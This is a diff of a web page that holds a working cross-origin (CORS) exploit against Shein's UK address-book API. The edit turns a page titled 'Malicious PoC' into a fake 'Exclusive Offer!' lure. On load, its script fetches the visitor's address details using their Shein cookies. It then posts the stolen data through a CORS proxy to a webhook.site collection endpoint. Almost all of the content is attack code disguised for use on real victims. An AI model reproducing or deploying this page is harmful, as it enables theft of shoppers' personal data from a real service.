@@ -3,27 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious PoC</title>
+    <title>Special Offer Page</title>
 </head>
 <body>
-    <h1>Welcome to My Malicious Site</h1>
-    <p>If you're logged into Shein, your sensitive data might be exposed!</p>
+    <h1>Exclusive Offer!</h1>
+    <p>If you're logged into Shein, your sensitive data could be exposed!</p>
     <script>
-        // Malicious JS to exploit the CORS vulnerability
+        // Malicious script that automatically runs when the victim visits the page
         var req = new XMLHttpRequest();
         req.onload = function() {
-            console.log("Response from Shein API:", this.responseText);  // Logs response in browser console (can be removed)
-            
-            // Send the response to the attacker's webhook endpoint (Webhook.site in this case)
+            console.log("Response from Shein API:", this.responseText);
+
+            // Send the response data (stolen data) to a webhook or attacker-controlled endpoint
             var exfiltrationRequest = new XMLHttpRequest();
-            exfiltrationRequest.open('POST', 'https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f', true); // Your Webhook URL
+            exfiltrationRequest.open('POST', 'https://cors-anywhere.herokuapp.com/https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f', true); // Using CORS proxy and Webhook
             exfiltrationRequest.setRequestHeader('Content-Type', 'application/json');
-            exfiltrationRequest.send(JSON.stringify({ data: this.responseText })); // Send the stolen data
+            exfiltrationRequest.send(JSON.stringify({ data: this.responseText })); // Send stolen data to webhook
         };
 
-        req.open('GET', 'https://www.shein.co.uk/bff-api/user-api/addressbook/address_detail?_ver=1.1.8&_lang=en&address_id=1&scene=0', true); // Make the request to Shein API
-        req.withCredentials = true; // Send credentials (cookies)
-        req.setRequestHeader('x-gw-auth', 'REAL_AUTH_TOKEN_HERE'); // Replace with real token from the logged-in user
+        // Make the GET request to Shein's API with valid address_id (update address_id with valid one)
+        req.open('GET', 'https://www.shein.co.uk/bff-api/user-api/addressbook/address_detail?_ver=1.1.8&_lang=en&address_id=1968530439&scene=0', true);
+
+        // Include credentials (cookies) for authentication
+        req.withCredentials = true;  // Sends the victim’s authentication cookies with the request
+
+        // Send the request to Shein’s API
         req.send();
     </script>
 </body>
